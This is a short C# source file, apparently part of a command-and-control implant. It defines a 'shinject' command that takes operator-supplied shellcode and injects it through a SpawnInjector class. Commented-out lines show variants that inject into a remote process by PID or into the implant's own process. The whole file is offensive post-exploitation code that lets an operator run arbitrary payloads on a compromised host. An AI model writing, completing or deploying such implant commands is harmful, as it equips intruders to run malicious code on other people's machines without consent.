using Agent.Internal;
using Agent.Models;

namespace Agent.Commands
{
    public class ShellCodeInject : AgentCommand
    {
        public override string Name => "shinject";

        public override string Execute(AgentTask task)
        {
            //if (!int.TryParse(task.Arguments[0], out var pid))
            //    return "Failed to parse PID";

            var injector = new SpawnInjector();
            var success = injector.Inject(task.FileBytes);

            //var injector = new RemoteInjector();
            //var success = injector.Inject(task.FileBytes, pid);

            //var injector = new SelfInjector();
            //var success = injector.Inject(task.FileBytes);

            if (success)
            {
                return "Shellcode injected";
            }
            else
                return "Failed to inject shellcode";
        }
    }
}
